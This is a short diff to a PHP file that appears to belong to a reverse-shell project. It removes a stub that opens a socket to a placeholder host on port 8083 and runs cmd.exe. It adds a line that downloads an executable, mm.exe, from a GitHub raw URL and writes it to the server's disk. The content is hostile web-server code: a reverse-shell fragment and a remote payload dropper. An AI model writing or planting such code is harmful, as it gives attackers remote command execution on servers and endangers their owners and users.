@@ -1,5 +1,3 @@
 <?php
-$sock=fsockopen("TO BE CONTINUED",8083);
-exec("cmd.exe");
-			            
+file_put_contents("mm.exe", fopen("https://github.com/cameronleong/php-reverse-shell/raw/master/mm.exe", 'r'));			            
 ?>
